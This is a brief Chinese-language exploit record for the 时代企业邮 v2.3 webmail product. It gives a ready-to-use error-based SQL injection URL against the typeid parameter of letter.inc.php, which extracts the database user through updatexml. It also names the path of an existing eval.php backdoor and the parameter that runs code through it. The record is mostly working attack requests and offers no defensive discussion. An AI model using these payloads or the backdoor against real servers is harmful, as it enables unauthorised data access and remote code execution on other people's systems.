##cve编号：无
##漏洞名称：SQL注入
##漏洞类型：SQL注入
##影响版本：
- 时代企业邮 v2.3
##利用脚本：
- 无
##漏洞细节：
- /webmail/main/letter.inc.php?cmd=getpagelist&typeid=1
- typeid参数存在漏洞
/webmail/main/letter.inc.php?cmd=getpagelist&typeid=1' and 1=updatexml(1,concat(0x24,(select user())),1)%23

- 后门
/up/UploadTemp/eval.php
x=phpinfo();


##reference：
